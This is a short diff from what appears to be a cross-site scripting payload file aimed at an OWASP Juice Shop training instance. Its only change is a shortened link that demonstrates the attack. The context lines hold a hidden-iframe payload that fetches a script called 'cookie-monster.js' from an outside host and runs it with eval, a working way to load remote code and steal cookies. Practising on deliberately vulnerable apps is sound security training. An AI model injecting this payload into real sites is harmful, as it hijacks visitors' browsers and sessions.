@@ -15,4 +15,4 @@ alert(
 );
 
 // <iframe style="display: none" src="javascript:fetch(`https://malicious.xsfs.xyz/public/cookie-monster.js`).then((response) => { return response.text() }).then((data) => { eval(data) });">
-// https://bit.ly/43HWv5c <- this in action on a juice-shop instance
+// https://bit.ly/3YcpxbO <- this in action on a juice-shop instance
